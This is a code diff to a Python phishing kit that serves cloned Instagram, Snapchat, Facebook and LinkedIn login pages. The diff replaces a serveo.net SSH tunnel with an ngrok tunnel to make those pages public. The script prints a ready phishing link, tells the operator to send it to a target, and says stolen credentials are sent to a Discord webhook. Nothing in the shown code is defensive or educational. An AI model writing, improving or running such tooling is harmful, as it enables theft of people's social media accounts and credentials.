@@ -15,31 +15,65 @@ import re
 # Initialize colorama for Windows
 colorama.init()
 
-# Custom HTTP Handler with modified User-Agent
-class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
-    def version_string(self):
-        return 'CustomServer/1.0'
-    
-    def send_header(self, keyword, value):
-        if keyword.lower() == 'server':
-            # Skip the server header
-            return
-        http.server.SimpleHTTPRequestHandler.send_header(self, keyword, value)
+def install_ngrok():
+    print("\nChecking ngrok installation...")
+    try:
+        # Check if ngrok is installed
+        subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
+        print("✓ Ngrok is already installed")
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        print("× Ngrok not found. Installing...")
+        try:
+            # Add ngrok repository and install
+            os.system('curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null')
+            os.system('echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list')
+            os.system('sudo apt update')
+            os.system('sudo apt install ngrok -y')
+            print("✓ Ngrok installed successfully")
+        except Exception as e:
+            print(f"× Error installing ngrok: {str(e)}")
+            return False
+    return True
+
+def setup_ngrok_auth():
+    print("\nChecking ngrok authentication...")
+    try:
+        # Try to get tunnels to check if auth is set
+        requests.get("http://localhost:4040/api/tunnels")
+        print("✓ Ngrok auth token already configured")
+        return True
+    except:
+        print("× Ngrok auth token not configured")
+        print("\nPlease get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
+        token = input("Enter your ngrok auth token: ").strip()
+        
+        if token:
+            try:
+                result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
+                                     capture_output=True, text=True)
+                if result.returncode == 0:
+                    print("✓ Auth token configured successfully")
+                    return True
+                else:
+                    print(f"× Error configuring auth token: {result.stderr}")
+                    return False
+            except Exception as e:
+                print(f"× Error configuring auth token: {str(e)}")
+                return False
+        else:
+            print("× No token provided")
+            return False
 
 def serve_website(platform):
     # Define the directory to serve based on platform
     if platform.lower() == 'instagram':
         directory = 'web/instagram'
-        subdomain = f"insta-{random.randint(1000,9999)}"
     elif platform.lower() == 'snapchat':
         directory = 'web/snapchat'
-        subdomain = f"snap-{random.randint(1000,9999)}"
     elif platform.lower() == 'facebook':
         directory = 'web/facebook'
-        subdomain = f"fb-{random.randint(1000,9999)}"
     elif platform.lower() == 'linkedin':
         directory = 'web/linkedin'
-        subdomain = f"in-{random.randint(1000,9999)}"
     else:
         print("Invalid platform selected")
         return
@@ -48,7 +82,7 @@ def serve_website(platform):
     os.chdir(directory)
     
     print(f"\nStarting {platform} phishing page...")
-    print("Initializing serveo.net tunnel...")
+    print("Initializing ngrok tunnel...")
     
     try:
         # Start a simple HTTP server in the background
@@ -70,102 +104,78 @@ def serve_website(platform):
         server_thread.daemon = True
         server_thread.start()
         
-        print("\nTesting SSH connection to serveo.net...")
-        test_command = "ssh -v serveo.net exit"
-        test_process = subprocess.Popen(test_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-        test_output, test_error = test_process.communicate()
+        # Kill any existing ngrok processes
+        if os.name == 'nt':  # Windows
+            os.system('taskkill /f /im ngrok.exe 2>nul')
+        else:  # Linux/Mac
+            os.system('pkill ngrok')
         
-        if test_process.returncode != 0:
-            print("× SSH connection test failed")
-            print("Detailed error:")
-            print(test_error)
-            print("\nTrying alternative connection method...")
-            # Try alternative port
-            tunnel_command = f"ssh -v -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -R {subdomain}:80:localhost:{PORT} serveo.net"
-        else:
-            print("✓ SSH connection test successful")
-            tunnel_command = f"ssh -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -R {subdomain}:80:localhost:{PORT} serveo.net"
+        time.sleep(1)
         
-        print("\nStarting SSH tunnel...")
-        if os.name == 'nt':
-            process = subprocess.Popen(tunnel_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-        else:
-            process = subprocess.Popen(tunnel_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+        # Start ngrok
+        print("\nStarting ngrok tunnel...")
+        if os.name == 'nt':  # Windows
+            tunnel_command = f"ngrok http {PORT}"
+            process = subprocess.Popen(tunnel_command, shell=True)
+        else:  # Linux/Mac
+            tunnel_command = f"ngrok http {PORT}"
+            process = subprocess.Popen(tunnel_command.split())
         
-        print("Establishing secure connection...")
-        time.sleep(2)
+        print("Waiting for ngrok to start...")
+        time.sleep(3)  # Give ngrok time to start
         
-        # Monitor the output for the forwarding URL
-        url_found = False
-        error_count = 0
-        while not url_found and error_count < 10:
-            line = process.stdout.readline()
-            if not line and process.poll() is not None:
-                error = process.stderr.read()
-                if error:
-                    if "Permission denied" in error:
-                        print("× Error: Permission denied. Try a different subdomain name.")
-                    elif "Connection refused" in error:
-                        print("× Error: Connection refused. Check your internet connection.")
-                    elif "remote port forwarding failed" in error.lower():
-                        print("× Error: Port forwarding failed. Subdomain might be in use.")
-                        print("Try running the script again for a new random subdomain.")
-                    else:
-                        print(f"× Error: {error}")
-                error_count += 1
-                continue
-            
-            print(f"Debug: {line.strip()}")  # Debug output
-            
-            if "Forwarding" in line and "HTTP" in line:
-                url = f"https://{subdomain}.serveo.net"
-                url_found = True
+        # Get the public URL from ngrok API
+        try:
+            response = requests.get("http://localhost:4040/api/tunnels")
+            tunnels = response.json()['tunnels']
+            if tunnels:
+                url = tunnels[0]['public_url']
+                if not url.startswith('https'):
+                    url = url.replace('http', 'https')
                 print(f"\n[+] Your phishing link is ready: {url}")
                 print("[+] Send this link to your target")
                 print("[+] Waiting for target to enter credentials...")
                 print("[+] Check your Discord webhook for incoming credentials")
                 print("\n[Press Ctrl+C to stop the server]")
-                break
-            
-        if not url_found:
-            print("\n× Failed to establish tunnel connection")
-            print("\nTroubleshooting steps:")
-            print("1. Check if SSH is installed and working:")
-            print("   ssh -V")
-            print("2. Try to establish a basic SSH connection:")
-            print("   ssh -v serveo.net")
-            print("3. If you get host key errors, run:")
-            print("   ssh-keygen -R serveo.net")
-            print("4. Make sure your internet connection is stable")
-            print("5. Try running with sudo: sudo python3 main.py")
+                
+                # Keep the server running until user interrupts
+                try:
+                    while True:
+                        time.sleep(1)
+                except KeyboardInterrupt:
+                    print("\nStopping server...")
+                    httpd.shutdown()
+                    process.terminate()
+                    # Kill ngrok
+                    if os.name == 'nt':
+                        os.system('taskkill /f /im ngrok.exe')
+                    else:
+                        os.system('pkill ngrok')
+            else:
+                print("× Error: No ngrok tunnels found")
+                print("Try configuring your auth token again:")
+                setup_ngrok_auth()
+                
+        except Exception as e:
+            print(f"× Error getting ngrok URL: {str(e)}")
+            print("Try configuring your auth token again:")
+            setup_ngrok_auth()
             httpd.shutdown()
             process.terminate()
-            os.chdir("../../")
-            return
-            
-        # Keep the server running until user interrupts
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("\nStopping server...")
-            httpd.shutdown()
-            process.terminate()
-            os.chdir("../../")  # Return to original directory
+            if os.name == 'nt':
+                os.system('taskkill /f /im ngrok.exe')
+            else:
+                os.system('pkill ngrok')
+        
+        os.chdir("../../")  # Return to original directory
             
     except Exception as e:
         print(f"\n× Error: {str(e)}")
         print("\nTroubleshooting steps:")
-        print("1. Make sure SSH is working:")
-        print("   a) Check SSH version: ssh -V")
-        print("   b) Test SSH: ssh -v serveo.net")
-        print("2. If you get host key errors:")
-        print("   ssh-keygen -R serveo.net")
-        print("3. Install/reinstall SSH if needed:")
-        print("   sudo apt update && sudo apt install openssh-client -y")
-        print("4. Check your firewall settings:")
-        print("   sudo ufw status")
-        print("5. Try running with sudo: sudo python3 main.py")
+        print("1. Make sure your auth token is correct")
+        print("2. Check your internet connection")
+        print("3. Make sure no other ngrok instances are running")
+        print("4. Try running with sudo: sudo python3 main.py")
         os.chdir("../../")  # Return to original directory
 
 def print_menu():
@@ -275,6 +285,16 @@ def print_menu():
     return input(colored(menu_options[-1], 'white'))
 
 def main():
+    # Check and install ngrok if needed
+    if not install_ngrok():
+        print("Failed to install ngrok. Please install it manually.")
+        return
+    
+    # Setup ngrok authentication
+    if not setup_ngrok_auth():
+        print("Failed to configure ngrok auth token. Please try again.")
+        return
+    
     while True:
         choice = print_menu()
         if choice == '1':
